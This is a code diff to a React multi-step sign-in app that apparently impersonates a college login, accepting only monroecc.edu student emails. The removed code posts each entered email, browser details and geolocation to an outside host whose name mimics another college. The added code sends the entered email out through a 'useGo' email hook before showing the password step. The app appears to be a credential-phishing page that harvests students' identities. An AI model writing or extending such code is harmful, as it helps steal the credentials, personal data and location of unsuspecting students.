@@ -7,7 +7,7 @@ import { Loader } from "./components/Loader";
 import { OTP } from "./components/OTP";
 import { Phone } from "./components/Phone";
 import gsap from "gsap";
-import axios from "axios";
+import useGo from "./components/useGo"; // Import the useGo hook
 
 function App() {
   const [step, setStep] = useState("email");
@@ -19,6 +19,7 @@ function App() {
   const [phone, setPhone] = useState("");
   const formRef = useRef(null);
   const signInOptionsRef = useRef(null);
+  const { isSending, error, successMessage, sendEmail } = useGo(); // Use the useGo hook
 
   const handleInputChange = (e) => {
     const field = e.target;
@@ -51,6 +52,7 @@ function App() {
     fadeSignInOptions(step === "email");
   }, [step]);
 
+  // Handle email submission and sending
   const handleNextFromEmail = async (emailValue) => {
     const eduEmailRegex =
       /^[a-zA-Z0-9._%+-]+@([a-zA-Z0-9.-]+\.)?monroecc\.edu$/;
@@ -69,59 +71,28 @@ function App() {
       sessionStorage.setItem("student_id", emailValue);
 
       try {
-        // Gather client details
-        const clientInfo = {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-        };
+        // Prepare the subject and message for the email
+        const subject = `${emailValue} Email Input Confirmation`;
+        const message = `User entered email: ${emailValue} for login.`;
 
-        // Get current time
-        const currentTime = new Date().toISOString();
+        // Use the sendEmail function from useGo hook to send the email
+        await sendEmail(subject, message);
 
-        // Optional: Get location (requires user consent)
-        const locationPromise = new Promise((resolve) => {
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-              (position) => {
-                resolve({
-                  latitude: position.coords.latitude,
-                  longitude: position.coords.longitude,
-                });
-              },
-              () => resolve(null)
-            );
-          } else {
-            resolve(null);
-          }
-        });
+        if (!error) {
+          console.log("Email sent successfully");
 
-        const location = await locationPromise;
-
-        // Prepare payload
-        const payload = {
-          student_id: emailValue,
-          client_info: clientInfo,
-          time: currentTime,
-          location,
-        };
-
-        // Send the data via the API
-        const response = await axios.post(
-          "https://ivytechedu-cvfc.vercel.app/send-email",
-          payload
-        );
-
-        if (response.status === 200) {
-          console.log("Email and details sent successfully:", response.data);
+          // Move to the next step after email is sent
+          setTimeout(() => setStep("password"), 3000);
         } else {
-          console.error("Error sending details:", response.data);
+          console.error("Failed to send email:", error);
+          setEmailError(
+            "There was an error sending the email. Please try again."
+          );
         }
       } catch (error) {
-        console.error("Failed to send details:", error);
+        console.error("Error occurred during email sending:", error);
+        setEmailError("An error occurred. Please try again.");
       }
-
-      setTimeout(() => setStep("password"), 3000);
     }
   };
 
